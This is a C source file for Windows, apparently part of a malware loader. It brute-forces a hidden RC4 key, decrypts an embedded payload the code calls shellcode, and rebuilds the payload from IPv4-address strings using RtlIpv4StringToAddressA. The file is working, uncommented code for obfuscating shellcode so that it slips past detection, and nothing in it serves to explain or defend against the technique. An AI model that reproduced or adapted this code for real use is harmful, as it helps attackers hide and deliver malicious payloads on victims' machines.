#include <Windows.h>
#include <stdio.h>

// Disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

typedef struct Rc4Context {
	unsigned int i;
	unsigned int j;
	unsigned char s[256];
};

// https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv4stringtoaddressa
typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR		S,
	BOOLEAN		Strict,
	PCSTR* Terminator,
	PVOID		Addr
	);

int rc4Init(struct Rc4Context* context, const unsigned char* ProtectedKey, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	//Check parameters
	if (context == NULL || ProtectedKey == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		// Randomize the permutations using the supplied key
		j = (j + context->s[i] + ProtectedKey[i % length]) % 256;

		// Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}
	return 0;
}

void rc4Cipher(struct Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// If the input and output are valid
		if (input != NULL && output != NULL)
		{
			// XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			// Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}

PBYTE BruteForceDecryption(IN BYTE HintByte, IN unsigned char* pProtectedKey, IN SIZE_T sKey) {

	BYTE            b = 0;
	INT             i = 0;
	PBYTE           pRealKey = (PBYTE)malloc(sKey);

	if (!pRealKey) {
		return NULL;
	}

	while (1) {

		if (((pProtectedKey[0] ^ b)) == HintByte)
			break;
		else
			b++;

	}

	for (int i = 0; i < sKey; i++) {
		pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
	}

	// *ppRealKey = pRealKey;
	return pRealKey;
}

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
				TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	PCSTR		Terminator = NULL;

	NTSTATUS	STATUS = NULL;

	// Getting RtlIpv4StringToAddressA address from ntdll.dll
	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
	if (pRtlIpv4StringToAddressA == NULL) {
		// printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of IPv4 addresses * 4
	sBuffSize = NmbrOfElements * 4;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		// printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the IPv4 addresses saved in Ipv4Array
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv4 address at a time
		// Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
		if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			// printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
			return FALSE;
		}

		// 4 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 4);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;
}

BOOL Decrypt_by_RC4(unsigned char* shellcode, size_t shellcode_length, unsigned char* ProtectedKey, size_t ProtectedKey_Length, OUT PVOID pbuffer, OUT SIZE_T *psize) {

	// Brute Forcing the Key
	PBYTE pRealKey = NULL;
	BYTE b = NULL;
	BYTE HINT_BYTE = 0xAC;

	(PBYTE)pRealKey = BruteForceDecryption((BYTE) HINT_BYTE, (unsigned char*) ProtectedKey, (SIZE_T) ProtectedKey_Length);

	// Intializing the struct
	struct Rc4Context ctx = { 0 };
	rc4Init(&ctx, pRealKey, ProtectedKey_Length);

	// Decryption
	unsigned char* PlainText = (unsigned char*)malloc(shellcode_length);
	ZeroMemory(PlainText, shellcode_length);
	rc4Cipher(&ctx, shellcode, PlainText, shellcode_length);

	// Printing the shellcode's string
	// printf("[i] PlainText : \"%.*s\" \n", (size_t)shellcode_length, (unsigned char*)PlainText);

	//for (int i = 0; i < shellcode_length; i++) {
	//	printf("%02X ", PlainText[i]);
	//}
	//printf("\n");

	// De-Obfuscating IPv4
	PBYTE	pDAddress = NULL;
	SIZE_T	sDSize = NULL;
	#define NumberOfElements 115
	// #define NumberOfElements 64

	// Add code to make PlainText into an array of pointers to each ipaddress.
	// Right now, its just a bunch of char arrays with NULL pointers clumped together. 

	unsigned char** ips = malloc(NumberOfElements * sizeof(char*));
	int temp = 0;

	for (int i = 0; i < NumberOfElements; i++) {
		ips[i] = malloc(16 * sizeof(char));
		ZeroMemory(ips[i], 16);
	}
	
	int j = 0;
	// for every ip
	while (j < NumberOfElements){
		// iterate chars until it hits NULL byte
		for (int i = 0; i < shellcode_length; i++) {
			if (PlainText[i] == NULL) {
				if (temp == 0) {
					// copy to array of pointers ips from start of ip to null byte
					strncpy(ips[j], &PlainText[temp], (i - temp));
				}
				else {
					// add + 1 so start of ip is after the null byte
					strncpy(ips[j], &PlainText[temp + 1], (i - temp));
				}
				temp = i;
				// print for debug
				// printf("Stored Bytes: %s\n", ips[j]);
				j++;
			}
			if (PlainText[i] == 0xcc) {
					temp += 1;
			}
		}
	}
	if (!Ipv4Deobfuscation(ips, NumberOfElements, &pDAddress, &sDSize))
		return -1;

	//printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
	//for (size_t i = 0; i < sDSize; i++) {
	//	if (i % 16 == 0)
	//		printf("\n\t");
	//	printf("%0.2X ", pDAddress[i]);
	//}

	memcpy(pbuffer, pDAddress, sDSize);
	*psize = sDSize;
	HeapFree(GetProcessHeap(), 0, pDAddress);
	free(PlainText);
	return TRUE;
}
